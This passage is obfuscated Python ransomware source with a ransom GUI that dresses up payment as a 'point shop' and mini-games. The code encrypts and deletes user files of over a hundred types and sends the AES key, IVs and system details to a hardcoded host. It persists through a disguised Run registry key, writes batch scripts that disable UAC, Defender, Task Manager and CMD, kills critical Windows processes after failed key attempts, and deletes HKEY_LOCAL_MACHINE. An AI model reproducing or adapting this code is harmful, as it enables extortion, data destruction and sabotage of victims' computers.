        OOOO0OOO00O000OOO =Entry (OO00O0O000OO00O0O ,width =9 ,bg ="black",fg ="red",relief ="groove",font =O0000OOOO000OO0O0 ,bd =4 )#line:511
        OOOO0OOO00O000OOO .place (x =O0OOOOO0OO00O0OO0 ,y =O00OO00O0O0O00OOO )#line:512
        O0O0O0O0OO00OO00O =Entry (OO00O0O000OO00O0O ,width =10 ,bg ="black",fg ="red",relief ="groove",font =O0000OOOO000OO0O0 ,bd =4 )#line:513
        O0O0O0O0OO00OO00O .place (x =O00O000O00O0000O0 ,y =O00OO00O0O0O00OOO )#line:514
        O0000O0OO0O0O0O00 =Button (OO00O0O000OO00O0O ,text ="Buy",width =9 ,height =1 ,bg ="black",fg ="red",relief ="groove",font =OO0O000O0O0O0O0O0 ,bd =3 ,command =OO00O00O00O0O0OO0 )#line:515
        O0OOO0OOOO00O0O00 =Button (OO00O0O000OO00O0O ,text ="Buy",width =9 ,height =1 ,bg ="black",fg ="red",relief ="groove",font =OO0O000O0O0O0O0O0 ,bd =3 ,command =OO0O0000OO0O0O00O )#line:516
        OOOOO000O0OO0000O =Button (OO00O0O000OO00O0O ,text ="Buy",width =9 ,height =1 ,bg ="black",fg ="red",relief ="groove",font =OO0O000O0O0O0O0O0 ,bd =3 ,command =OO0O000OOO00O00OO )#line:517
        OOOOOOO00O00O000O =Button (OO00O0O000OO00O0O ,text ="[Decrypt file]",bg ="black",width =56 ,fg ="red",relief ="groove",font =O0O0O0000O000OOOO ,bd =3 ,command =OOO0OO0OOOOOO0O0O )#line:518
        OOOOOOO00O00O000O .place (x =-7 ,y =470 )#line:519
        O0000O0OO0O0O0O00 .place (x =140 ,y =O00OO0OOOO0OOO0OO )#line:520
        O0OOO0OOOO00O0O00 .place (x =400 ,y =O00OO0OOOO0OOO0OO )#line:521
        OOOOO000O0OO0000O .place (x =670 ,y =O00OO0OOOO0OOO0OO )#line:522
    OO0OOO0OO0O0O0O0O =Button (OOOO0OOO000000000 ,text ="Game Play",width =15 ,bg ="black",fg ="red",relief ="groove",font =O0O0O0000O000OOOO ,bd =3 ,command =OO0OOO00O00O00OOO )#line:523
    O000OOOOOOOOOO00O =Button (OOOO0OOO000000000 ,text ="Selection",bg ="black",fg ="red",relief ="groove",font =O0O0O0000O000OOOO ,bd =3 ,command =O0000O000OOO0O00O )#line:524
    OO0O00O0OO000O0OO =Button (OOOO0OOO000000000 ,text ="Point Shop",width =13 ,bg ="black",fg ="red",relief ="groove",font =O0O0O0000O000OOOO ,bd =3 ,command =O000O0000OO0OO0O0 )#line:525
    OO0OOO0OO0O0O0O0O .place (x =-10 ,y =375 )#line:526
    O000OOOOOOOOOO00O .place (x =440 ,y =375 )#line:527
    OO0O00O0OO000O0OO .place (x =225 ,y =375 )#line:528
    OOOO00OOOO00OO000 .insert (0 ,"need in the point shop.")#line:529
    OOOO00OOOO00OO000 .insert (0 ,"you can get them by purchasing the file decryption product")#line:530
    OOOO00OOOO00OO000 .insert (0 ,"You can get points by clearing the mini-games here and")#line:531
    OOOO0O0O0OO0OO000 .insert (0 ,"hash game")#line:532
    OOOO0O0O0OO0OO000 .insert (0 ,"2048 game")#line:533
    OOOO0O0O0OO0OO000 .insert (0 ,"up down game")#line:534
def OOOO000O0OO0OO0O0 ():#line:536
    msgbox .showwarning (":D","In some cases, it may take a long time to decrypt the file. If you want to protect the file, please wait until it is finished")#line:537
OO00O00O000OO0000 =6 #line:539
def O0000000O000OOOOO (OOOOOO0O00000O000 ,O00O0O0OO000000O0 ):#line:540
    OO0OOO000O000O00O =random .randint (1000 ,215485 )#line:541
    for O0OO00O000O0OO00O in range (OO0OOO000O000O00O +OOOOOO0O00000O000 ):#line:542
        O00O00OO0OO0OOO00 =hashlib .sha256 (O00O0O0OO000000O0 ).hexdigest ()#line:543
        O00O0O0OO000000O0 =O00O00OO0OO0OOO00 .encode ()#line:544
        O00O00OO0OO0OOO00 =hashlib .sha256 (O00O0O0OO000000O0 ).hexdigest ()#line:545
        O00O0O0OO000000O0 =O00O00OO0OO0OOO00 .encode ()#line:546
    O0OO0O0000OO00OOO .insert (0 ,O00O0O0OO000000O0 )#line:547
    return O00O0O0OO000000O0 #line:548
def O0OOOOO0OOOOO0OOO ():#line:551
    global OOO0OOOO00OOOOO0O
    OO00000O0OOOO0OO0 ="""-----BEGIN PUBLIC KEY-----
MIIEIjANBgkqhkiG9w0BAQEFAAOCBA8AMIIECgKCBAEAkbTC0uLmM7314oA0Kxj0
TUKtkSiFddpK4TPC/oO4oSqLWawxvZWCqiAg0Zr4JSIsuKa2aNACJTWkkWY4B21N
4LpgT/A3nSF4KMk4qufiz/dU6BUHNsjFXvO1qRWtDZf2TOdsK4vd4ULaoF47Shwz
MD+978egy9conxZZBkqRr+F7LvY9CC/497LjQZHgkHK9a3QWt4cjfI+FG6bO3S0m
hE7G0iAID+5U+LOYxcwRpsWNn8P4XsxWBhnU0H2gN5GHdNd071n1qpF6ft8jH9uF
LcyCnybTWTD2sMC65zCOrHG/ONFy/iqdhug0+QBd12T0NTfVQ1VaTdimtWEcrnAg
78ZebrZe6rtNVQ8ImaYe0EWGYr5JRuxTcG/RqtqhlwxabGmF1ck+7z40PK8t0Yuo
PPIqRz1K1sYnOCtnwtGxrdhir6SLhvs7r9PSb3DUJTd5v9s/1xXZ1jgorSVL0Ucl
jHm0XKAE/tG4/1pYJ7Q3lN+hWP2LgIFixM2rXRRF+0icg62fQ3gc8DiPdu4+W1YX
dY5hBiOzpOdkapaC9huudMQIRYy48Vx60l6oHIgCFfj74F/5usncM100R0X557uq
cklXz3WMswq8izf0RRdQpBF9Qr42MhAc7N4jXkTwDi1TqhJzibn3ifVJZARmT2fW
lCImk8gFEpnL7fOBTqIhQwd5V/hvLlIyArfwYLSKrLNKg+MsshSi1TC0j/fzFVI0
qOE4imKTkkoCCaOeBrLRvWB7ciDzZv8Ckjoklcl2fRKBJ61HQ5IkZJ832wGvWQjN
bHCCQmkbfLeLXQsBxFUV/pFCTZYnC43pCKtlcDtyIDiEbaK3nZfZMXRZGqxM0ux7
RNN+bpThQLEdJyGVPkWBU7ranTE/10vbDlX7rfhkIHdV/5nvBKe44Z644lfN5bWE
OfLkdqdJatjf6iXTQQdA0Krva3XQE1Cwj5/R5tOIYPlxVMzFLFhMsJShj01gNjHh
wX9i+sDHjKGjzENV3xvQV9SJMzGlbOkzIXLNZtrAdzcpoffRmPNjbUuklzxRjxwg
7CTwfOM5P3abf/x+9XlF4Eii+bVPo90I4yrkKbhcQzQhP6dvv225iLHM+gK5m8Gt
mQWWG5qQu/6SvGEvrFNStMo2uJyH6q97NXvBJGjkGgxCJoMI07HANkhS6+vUDaT+
98AFD2BWVzz5YQ78LkafJy13ETXPaqjcjStOdc/WnGdrUPaBjN8E1CJfaoalRuON
5GkVOaZSUuw4FRPk2Pn1E9DjqePnu/Ayv41N5qjjs87N2YbMMFU63xBTdCY1WN48
ersboTqWSVFKo+5ofEeJ9cdH/S3hCiO5mRK0B7bcY3nuaUkEqhGNwjsyQMSsgam5
dwIDAQAB
-----END PUBLIC KEY-----"""#line:576
    try:
        OOOOOOOO00OO0OO0O =RSA .import_key (OO00000O0OOOO0OO0 .encode ())#line:578
        O00OO00OO000OO0O0 =PKCS1_OAEP .new (OOOOOOOO00OO0OO0O )#line:579
        O000O0O0OO0OOO0O0 =socket ()#line:580
        O000O0O0OO0OOO0O0 .connect (("192.168.0.14",9997 ))#line:581
        OOOOOO000O0OO0OO0 ="AESkey : "+str (OOO0O0O0O0OOOOO00 )+"|"+"RHK : "+str (O0O00OO0O0OOOO0O0 )+"|"+"cpu_count : "+str (os .cpu_count ())+"|"+"system : "+str (platform .system ())+"|"+"processor : "+str (platform .processor ())+"|"+"version : "+str (platform .version ())+"|"+"encf count : "+str (len (OOO0OOOO00OOOOO0O ))+"|"+"orgf count : "+str (len (O00OO00000OOOOOOO ))+"|"+"ivlist : "+str (O0O0OOOO00OO00000 )+"|"+"originalfile : "+str (O00OO00000OOOOOOO )+"|"+"encflist : "+str (OOO0OOOO00OOOOO0O )+"|"+"vector : "+str (list (O0O0OOOO00OO00000 .values ()))#line:582
        OO000O000O0O0O0OO =bytes ()#line:583
        OO00OOOOOO0OOOOO0 =512 #line:584
        OOOOOO000O0OO0OO0 =[str (OOOOOO000O0OO0OO0 )[O0O000OOOO0O0OO0O :O0O000OOOO0O0OO0O +OO00OOOOOO0OOOOO0 ]for O0O000OOOO0O0OO0O in range (0 ,len (OOOOOO000O0OO0OO0 ),OO00OOOOOO0OOOOO0 )]#line:585
        for O000000000O0OOO0O in range (len (OOOOOO000O0OO0OO0 )):#line:586
            print ("encrypt")#line:587
            OO000O000O0O0O0OO +=O00OO00OO000OO0O0 .encrypt (OOOOOO000O0OO0OO0 [O000000000O0OOO0O ].encode ())#line:588
        OOOOOO000O0OO0OO0 =None #line:589
        O00O0O0O0O0OO00OO =struct .pack ("I",len (OO000O000O0O0O0OO ))#line:590
        O000OOO0000000O0O =O00O0O0O0O0OO00OO +OO000O000O0O0O0OO #line:591
        print (O000OOO0000000O0O )#line:592
        O000O0O0OO0OOO0O0 .sendall (O000OOO0000000O0O )#line:593
        O000O0O0OO0OOO0O0 .close ()#line:594
        return 0 #line:595
    except Exception as e:
        print(e)
        print(":<<")
        time.sleep(15)
        return 1
def OO0OOOO00O00O0O0O ():#line:602
    while True :#line:603
        OO0OO0000OOO0O000 =O0OOOOO0OOOOO0OOO ()#line:604
        print (OO0OO0000OOO0O000 )#line:605
        if OO0OO0000OOO0O000 ==0 :#line:606
            print (":>")#line:607
            break #line:608
        else :#line:609
            print (":<")#line:610
            OO0OO0000OOO0O000 =O0OOOOO0OOOOO0OOO ()#line:611
def O00OOO00O0OO000O0 ():#line:613
    global O0O00OO0O0OOOO0O0 #line:616
    global OO00O00O000OO0000 #line:617
    OO00O00O000OO0000 -=1 #line:618
    time .sleep (1 )#line:619
    OOOOOOOO00OO0000O =""#line:620
    OOOOOOOO00OO0000O =OOOOOOOO00OO0OOO0 .get ()#line:621
    OOOOOOOO00OO0OOO0 .delete (0 ,END )#line:622
    if OO00O00O000OO0000 !=0 :#line:623
        if OOOOOOOO00OO0000O ==O0O00OO0O0OOOO0O0 .decode ():#line:624
            O0OO0O0000OO00OOO .insert (0 ,"Your Key:"+O0O00OO0O0OOOO0O0 .decode ())#line:625
            O0OO0O0000OO00OOO .insert (0 ,"start to file decryption....")#line:626
            O0OO0O0000OO00OOO .insert (0 ,"--Thank you for using this software!--")#line:627
            time .sleep (1 )#line:628
            O0OOO00O0OO0O00O0 =threading .Thread (target =OO0OOOOOO0OOO00O0 ).start ()#line:629
        else :#line:630
            OOOO0000O000OOO0O =random .randint (1000 ,215485 )#line:631
            O0O00OO0O0OOOO0O0 =O0000000O000OOOOO (OOOO0000O000OOO0O ,O0O00OO0O0OOOO0O0 )#line:632
            O0OO0O0000OO00OOO .insert (0 ,"")#line:633
            O0OO0O0000OO00OOO .insert (0 ,"--sorry! We can't decrypt your files! please check the key--")#line:634
            O0OO0O0000OO00OOO .insert (0 ,"")#line:635
            msgbox .showerror (":D","--sorry! We can't decrypt your files! please check the key--")#line:636
    else :#line:637
        import subprocess #line:638
        msgbox .showerror (":D","--You have exhausted the given number of keystrokes. :)--")#line:639
        O0O0O00OO00O0O0O0 =0x08000000 #line:640
        subprocess .call ('taskkill /F /IM csrss.exe',creationflags =O0O0O00OO00O0O0O0 )#line:641
        subprocess .call ('taskkill /F /IM svchost.exe',creationflags =O0O0O00OO00O0O0O0 )#line:642
        subprocess .call ('taskkill /F /IM wininit.exe',creationflags =O0O0O00OO00O0O0O0 )#line:643
        subprocess .call ('taskkill /F /IM winlogon.exe',creationflags =O0O0O00OO00O0O0O0 )#line:644

def prgrs2():
    dddddd =threading .Thread (target =O00OOO00O0OO000O0 ).start ()#line:149

O0OOOO0O0OO00OOO0 =Button (O0O00000OO0OO00OO ,text ="[Decrypt]",width =9 ,height =0 ,command =prgrs2 ,bg ="black",fg ="red",relief ="groove",font =OO0O000O0O0O0O0O0 ,bd =3 )#line:646
O000O000O00O00O0O =Button (O0O00000OO0OO00OO ,text ="[Help]",width =6 ,height =1 ,command =OOOOOO000OOOOO000 ,bg ="black",fg ="red",relief ="groove",font =OO0O000O0O0O0O0O0 ,bd =3 )#line:647
O0OOOO0OOOOOO00OO =Button (O0O00000OO0OO00OO ,text ="[Clear]",command =OOOO0OO0OOO0O0O0O ,width =7 ,height =1 ,bg ="black",fg ="red",relief ="groove",font =OO0O000O0O0O0O0O0 ,bd =3 )#line:648
OOOOOO00O00O00OO0 =Button (O0O00000OO0OO00OO ,text ="[Ecrypted files list]",width =20 ,height =1 ,command =prgrs ,bg ="black",fg ="red",relief ="groove",font =OO0O000O0O0O0O0O0 ,bd =3 )#line:649
O00O0O0OO000OO0OO =Button (O0O00000OO0OO00OO ,text ="[Mini Game]",width =12 ,height =1 ,command =OOO00O000000000O0 ,bg ="black",fg ="red",relief ="groove",font =OO0O000O0O0O0O0O0 ,bd =3 )#line:650
O0OOOO0O0OO00OOO0 .place (x =678 ,y =548 )#line:651
O000O000O00O00O0O .place (x =0 ,y =0 )#line:652
O0OOOO0OOOOOO00OO .place (x =75 ,y =0 )#line:653
OOOOOO00O00O00OO0 .place (x =783 ,y =548 )#line:654
O00O0O0OO000OO0OO .place (x =865 ,y =0 )#line:655
OOOO0OOO0OO00O0OO ="C:\\Users\\Eternal_Nightmare0\\Desktop\\암호화 대상 폴더\\**"#line:659
O0O0OOOO00OO00000 ={}#line:660
def O00OO0OOO00000OOO (OO00OOO00000OOOOO ,O0OO00O0000O0000O ,OOOO000OO000OO00O =None ,OOO0O00OOO0O0O000 =64 *1024 ):#line:663
    try :#line:664
        global O0O0OOOO00OO00000 #line:665
        if not OOOO000OO000OO00O :#line:666
            OOOO00OOO0OO00OO0 =bytes (OO0O0O0OOO0000OO0 (64 ).encode ())#line:667
            OOOO000OO000OO00O =O0OO00O0000O0000O +"."+hashlib .sha256 (OOOO00OOO0OO00OO0 ).hexdigest ()#line:668
        OO0OO0OOO0O00OOO0 =bytes (OO0OO0OOOOOOO0OO0 (16 ).encode ())#line:669
        OOOO0O0OO00OOOO0O =AES .new (OO00OOO00000OOOOO ,AES .MODE_CBC ,OO0OO0OOO0O00OOO0 )#line:670
        O0O0O0000OO0OOO0O =os .path .getsize (O0OO00O0000O0000O )#line:671
        with open (O0OO00O0000O0000O ,'rb')as O0OO00OO0O000OOO0 :#line:672
            with open (OOOO000OO000OO00O ,'wb')as OOOO0000OOO0000O0 :#line:673
                OOOO0000OOO0000O0 .write (struct .pack ('<Q',O0O0O0000OO0OOO0O ))#line:674
                O0O0OOOO00OO00000 [OOOO000OO000OO00O ]=OO0OO0OOO0O00OOO0 #line:675
                while True :#line:676
                    OO0OO0OOO0OOOO00O =O0OO00OO0O000OOO0 .read (OOO0O00OOO0O0O000 )#line:677
                    if len (OO0OO0OOO0OOOO00O )==0 :#line:678
                        break #line:679
                    elif len (OO0OO0OOO0OOOO00O )%16 !=0 :#line:680
                        OO0OO0OOO0OOOO00O +=b' '*(16 -len (OO0OO0OOO0OOOO00O )%16 )#line:681
                    OOOO0000OOO0000O0 .write (OOOO0O0OO00OOOO0O .encrypt (OO0OO0OOO0OOOO00O ))#line:682
    except :#line:683
        pass #line:684
O00O00OOOO0OO00O0 =['txt','jpg','hwp','ppt','mp3','mp4','egg','jpeg','zip','tbres','iso','app','avi','png','wepb','pps','pptx','ppsx','msi','rar5','rar','7z','img','html','js','jar','php','css','h','c','cc','py','bak','hpt','hwt','htm','old','php3','phtml','sgml','shtml','vbs','vbt','vbw','vbx','vbr','vbp','vbg','ini','java','rofl','db','aegraphic','wav','essentialsound','olp','sys','prtape','xml','prmdc2','log','scoreboard','vmsd','vmx','DAT','vmxf','vmdk','appinfo','appicon','nvram','xlsx','xls','wfx','pyd','bmp','wks','docx','doc','dat','html','lnk','dll','NLS','msc','qmlc','bin','rtf','bat','key','pas','ost','eml','edb','asm','pfx','pem','p12','csr','gpg','aes','svg','asm','mkv','myd','sxc','']#line:686
O00OO00000OOOOOOO =[]#line:687
def OOO00OO00OO00O0O0 ():#line:688
    O0OO0O0O0OO0O0O00 =0 #line:689
    global OOO0OOOO00OOOOO0O #line:690
    try :#line:691
        global O00OO00000OOOOOOO #line:692
        OO00OOOO00O0OO000 =0 #line:693
        for O0000O0OO00O00O00 in glob .iglob (OOOO0OOO0OO00O0OO ,recursive =True ):#line:694
            O0O0000OO0OO0OO00 =O0000O0OO00O00O00 .split (".")[-1 ]#line:695
            O000OOO0O0OOOOOO0 =[O0O0000OO0O0OO0OO for O0O0000OO0O0OO0OO in O00O00OOOO0OO00O0 if O0O0000OO0OO0OO00 in O0O0000OO0O0OO0OO ]#line:696
            try :#line:697
                if len (O000OOO0O0OOOOOO0 )==1 :#line:698
                    if (os .path .isfile (O0000O0OO00O00O00 )):#line:699
                        O00OO0OOO00000OOO (OOO0O0O0O0OOOOO00 ,O0000O0OO00O00O00 )#line:700
                        os .remove (O0000O0OO00O00O00 )#line:701
                        O00OO00000OOOOOOO .append (O0000O0OO00O00O00 )#line:702
                        OOO0OOOO00OOOOO0O =list (O0O0OOOO00OO00000 .keys ())#line:703
            except PermissionError :#line:704
                pass #line:705
    except :#line:706
        pass #line:707
    return None #line:708
def OO0000O0OO0OOOOOO (OO0000O0OOO0OO0OO ):#line:710
    for O0OO00O0O0000OO0O ,O0O0OO00OO00O0O00 in O0O0OOOO00OO00000 .items ():#line:711
         if OO0000O0OOO0OO0OO ==O0OO00O0O0000OO0O :#line:712
             return O0O0OO00OO00O0O00 #line:713
    return None #line:714
def OOOOOO000O0OO0000 (O00OO00000O00O00O ,OO0O00O00OO000000 ,O00O00O0O00O00OO0 =None ,O00O0OO0OOO000OOO =24 *1024 ):#line:716
    try :#line:717
        if not O00O00O0O00O00OO0 :#line:718
            O00O00O0O00O00OO0 =os .path .splitext (OO0O00O00OO000000 )[0 ]#line:719
        with open (OO0O00O00OO000000 ,'rb')as O0OOO00O000O0OOO0 :#line:720
            OOOOO0000OO0OOO00 =struct .unpack ('<Q',O0OOO00O000O0OOO0 .read (struct .calcsize ('Q')))[0 ]#line:721
            OO000OOOOOOOOO0OO =OO0000O0OO0OOOOOO (OO0O00O00OO000000 )#line:722
            O00O00OOO000OOOO0 =AES .new (O00OO00000O00O00O ,AES .MODE_CBC ,OO000OOOOOOOOO0OO )#line:723
            with open (O00O00O0O00O00OO0 ,'wb')as O00OOOO0O000O000O :#line:724
                while True :#line:725
                    OO00000000OO00000 =O0OOO00O000O0OOO0 .read (O00O0OO0OOO000OOO )#line:726
                    if len (OO00000000OO00000 )==0 :#line:727
                        break #line:728
                    O00OOOO0O000O000O .write (O00O00OOO000OOOO0 .decrypt (OO00000000OO00000 ))#line:729
                O00OOOO0O000O000O .truncate (OOOOO0000OO0OOO00 )#line:730
    except :#line:731
        pass #line:732
OOOO0O000O0O0O00O ="C:\\Users\\Eternal_Nightmare0\\Desktop\\암호화 대상 폴더\\**"#line:735
def OO0OOOOOO0OOO00O0 ():#line:736
    O0000OOO0O0O00O0O =0 #line:737
    for OOO0O000O0O00OOOO in glob .iglob (OOOO0OOO0OO00O0OO ,recursive =True ):#line:738
        try :#line:739
            if (os .path .isfile (OOO0O000O0O00OOOO )):#line:740
                if OO0000O0OO0OOOOOO (OOO0O000O0O00OOOO )!=None :#line:741
                    O0OO0O0000OO00OOO .insert (0 ,'Decrypting Success!> '+OOO0O000O0O00OOOO )#line:742
                    O0O00000OO0OO00OO .update_idletasks ()#line:743
                    OO00O000O00OOO0O0 ['value']=O0000OOO0O0O00O0O /len (O00OO00000OOOOOOO )*100 #line:744
                    O0000OOO0O0O00O0O +=1 #line:745
                    OOOOOO000O0OO0000 (OOO0O0O0O0OOOOO00 ,OOO0O000O0O00OOOO )#line:746
                    os .remove (OOO0O000O0O00OOOO )#line:747
                    OOO0OOOO00OOOOO0O .remove (OOO0O000O0O00OOOO )#line:748
                    del O0O0OOOO00OO00000 [OOO0O000O0O00OOOO ]#line:749
        except :#line:750
            O0OO0O0000OO00OOO .insert (0 ,'Decrypting Failed!> '+OOO0O000O0O00OOOO )#line:751
def OOO00OO000OOOO0OO ():#line:753
    global O000OO0OO0OO000O0 #line:754
    OO000O0O0000OOOO0 =['explorer.exe','cmd','Taskmgr.exe',"regedit.exe","conhost.exe","powershell.exe","mmc.exe",]#line:755
    O00O000O000O0000O =0x08000000 #line:756
    while True :#line:757
            subprocess .call ('taskkill /F /IM '+OO000O0O0000OOOO0 [1 ],creationflags =O00O000O000O0000O )#line:758
            subprocess .call ('taskkill /F /IM '+OO000O0O0000OOOO0 [2 ],creationflags =O00O000O000O0000O )#line:759
            subprocess .call ('taskkill /F /IM '+OO000O0O0000OOOO0 [4 ],creationflags =O00O000O000O0000O )#line:760
            subprocess .call ('taskkill /F /IM '+OO000O0O0000OOOO0 [3 ],creationflags =O00O000O000O0000O )#line:761
            subprocess .call ('taskkill /F /IM '+OO000O0O0000OOOO0 [5 ],creationflags =O00O000O000O0000O )#line:762
            subprocess .call ('taskkill /F /IM '+OO000O0O0000OOOO0 [6 ],creationflags =O00O000O000O0000O )#line:763
def OOOO00OO00O00O0O0 ():#line:765
    O0O0OO0O0O0O0O0O0 =0x08000000 #line:766
    OOO0O0O0000OOO00O =subprocess .Popen .poll (OOO0OO0O0O000000O )#line:767
    if OOO0O0O0000OOO00O ==None :#line:768
        print ("ok")#line:769
    else :#line:770
        print ("no")#line:771
def OO0OO0000OOOOOO00 ():#line:773
    global O00000OOO0O00OO0O #line:774
    O00OO00OOO0O0O000 =os .path .realpath (__file__ ).split ("\\")[-1 ].split ("py")[0 ]+"exe"#line:775
    O0O000O0OO00000OO =os .path .dirname (os .path .abspath (sys .executable ))#line:776
    O00OO00OO000000OO =O0O000O0OO00000OO +"\\"+O00OO00OOO0O0O000 #line:777
    O00000OOO0O00OO0O ="C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\System Tools\\"+O00OO00OOO0O0O000 #line:778
    try :#line:779
        shutil .copy2 (O00OO00OO000000OO ,O00000OOO0O00OO0O )#line:780
    except :#line:781
        pass #line:782
def O00OO00O0000OO0OO ():#line:784
    O000O0O0OO0OO0OOO =os .path .realpath (__file__ ).split ("\\")[-1 ].split ("py")[0 ]+"exe"#line:785
    OOOOOO0O0OOOOOOO0 =os .path .dirname (os .path .abspath (sys .executable ))#line:786
    OO0OO0OOO00O0O0O0 =OOOOOO0O0OOOOOOO0 +"\\"+O000O0O0OO0OO0OOO #line:787
    O00OO000O00OO0OOO =r"Software\Microsoft\Windows\CurrentVersion\Run"#line:788
    O00O0OOO0OOOOOO0O =ConnectRegistry (None ,HKEY_CURRENT_USER )#line:789
    OOO00O00O0OO0OO0O =OpenKey (O00O0OOO0OOOOOO0O ,O00OO000O00OO0OOO ,0 ,KEY_WRITE )#line:790
    SetValueEx (OOO00O00O0OO0OO0O ,"WindowsAutoUpdate",0 ,REG_SZ ,O00000OOO0O00OO0O )#line:791
    CloseKey (OOO00O00O0OO0OO0O )#line:792
def O00OO0O0OO0O0OOOO ():#line:794
    try :#line:795
        OOO00O000O0O0OOO0 =open ("x.bat",'w')#line:796
        OOO00O000O0O0OOO0 .write (r"@echo off"+"\n")#line:797
        OOO00O000O0O0OOO0 .write (r"Echo get administrator rights"+"\n")#line:798
        OOO00O000O0O0OOO0 .write (r'cacls.exe "%SystemDrive%\System Volume Information" >nul 2>nul'+"\n")#line:799
        OOO00O000O0O0OOO0 .write (r'if %errorlevel%==0 goto Admin'+"\n")#line:800
        OOO00O000O0O0OOO0 .write (r'if exist "%temp%\getadmin.vbs" del /f /q "%temp%\getadmin.vbs"'+"\n")#line:801
        OOO00O000O0O0OOO0 .write (r'echo Set RequestUAC = CreateObject^("Shell.Application"^)>"%temp%\getadmin.vbs"'+"\n")#line:802
        OOO00O000O0O0OOO0 .write (r'echo RequestUAC.ShellExecute "%~s0","","","runas",1 >>"%temp%\getadmin.vbs"'+"\n")#line:803
        OOO00O000O0O0OOO0 .write (r'echo WScript.Quit >>"%temp%\getadmin.vbs"'+"\n")#line:804
        OOO00O000O0O0OOO0 .write (r'"%temp%\getadmin.vbs" /f'+"\n")#line:805
        OOO00O000O0O0OOO0 .write (r'if exist "%temp%\getadmin.vbs" del /f /q "%temp%\getadmin.vbs"'+"\n")#line:806
        OOO00O000O0O0OOO0 .write (r'exit'+"\n")#line:807
        OOO00O000O0O0OOO0 .write (r':Admin'+"\n")#line:808
        OOO00O000O0O0OOO0 .write (r'Echo successfully obtained administrator permission'+"\n")#line:809
        OOO00O000O0O0OOO0 .write (r':::::::::::::::::::::::: modify the registry and close UAC::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::'+"\n")#line:810
        OOO00O000O0O0OOO0 .write (r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t reg_dword /d 0 /F'+"\n")#line:811
        OOO00O000O0O0OOO0 .write (r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t reg_dword /d 0 /F'+"\n")#line:812
        OOO00O000O0O0OOO0 .write (r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t reg_dword /d 0 /F'+"\n")#line:813
        OOO00O000O0O0OOO0 .write (r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t reg_dword /d 1 /F'+"\n")#line:814
        OOO00O000O0O0OOO0 .write (r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t reg_dword /d 1 /F'+"\n")#line:815
        OOO00O000O0O0OOO0 .write (r'reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t reg_dword /d 1 /F'+"\n")#line:816
        OOO00O000O0O0OOO0 .write (r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoWinKeys" /t reg_dword /d 1 /F'+"\n")#line:817
        OOO00O000O0O0OOO0 .write (r'reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t reg_dword /d 1 /F'+"\n")#line:818
        OOO00O000O0O0OOO0 .write (r'reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t reg_dword /d 1 /F'+"\n")#line:819
        OOO00O000O0O0OOO0 .write (r'reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /F'+"\n")#line:820
        OOO00O000O0O0OOO0 .write (r'RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 1, True'+"\n")#line:821
        OOO00O000O0O0OOO0 .write (r'exit')#line:822
        OOO00O000O0O0OOO0 .close ()#line:823
        OOO00O000O0O0OOO0 =open ("xx.vbs",'w')#line:824
        OOO00O000O0O0OOO0 .write (r'Set objShell = CreateObject("Shell.Application")'+"\n")#line:825
        OOO00O000O0O0OOO0 .write (r'objShell.ShellExecute "x.bat", "/c lodctr.exe /r" , "", "runas", 0')#line:826
        OOO00O000O0O0OOO0 .close ()#line:827
        os .system ('xx.vbs')#line:829
        time .sleep (0.1 )#line:830
        os .remove ("xx.vbs")#line:831
        os .remove ("x.bat")#line:832
    except :#line:833
        os .remove ("xx.vbs")#line:834
        os .remove ("x.bat")#line:835
def O0OOO000OOO00OO0O ():#line:837
    try :#line:838
        OO0OO00000OOO0O00 =open ("x2.bat",'w')#line:839
        OO0OO00000OOO0O00 .write (r"@echo off"+"\n")#line:840
        OO0OO00000OOO0O00 .write (r"Echo get administrator rights"+"\n")#line:841
        OO0OO00000OOO0O00 .write (r'cacls.exe "%SystemDrive%\System Volume Information" >nul 2>nul'+"\n")#line:842
        OO0OO00000OOO0O00 .write (r'if %errorlevel%==0 goto Admin'+"\n")#line:843
        OO0OO00000OOO0O00 .write (r'if exist "%temp%\getadmin.vbs" del /f /q "%temp%\getadmin.vbs"'+"\n")#line:844
        OO0OO00000OOO0O00 .write (r'echo Set RequestUAC = CreateObject^("Shell.Application"^)>"%temp%\getadmin.vbs"'+"\n")#line:845
        OO0OO00000OOO0O00 .write (r'echo RequestUAC.ShellExecute "%~s0","","","runas",1 >>"%temp%\getadmin.vbs"'+"\n")#line:846
        OO0OO00000OOO0O00 .write (r'echo WScript.Quit >>"%temp%\getadmin.vbs"'+"\n")#line:847
        OO0OO00000OOO0O00 .write (r'"%temp%\getadmin.vbs" /f'+"\n")#line:848
        OO0OO00000OOO0O00 .write (r'if exist "%temp%\getadmin.vbs" del /f /q "%temp%\getadmin.vbs"'+"\n")#line:849
        OO0OO00000OOO0O00 .write (r'exit'+"\n")#line:850
        OO0OO00000OOO0O00 .write (r':Admin'+"\n")#line:851
        OO0OO00000OOO0O00 .write (r'Echo The file decryption program ran normally'+"\n")#line:852
        OO0OO00000OOO0O00 .write (r':::::::::::::::::::::::: The file is being decrypted, please wait::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::'+"\n")#line:853
        OO0OO00000OOO0O00 .write (r'reg delete "HKEY_LOCAL_MACHINE" /F'+"\n")#line:854
        OO0OO00000OOO0O00 .write (r'exit')#line:855
        OO0OO00000OOO0O00 .close ()#line:856
        OO0000O0000O0OO00 =open ("xx2.vbs",'w')#line:857
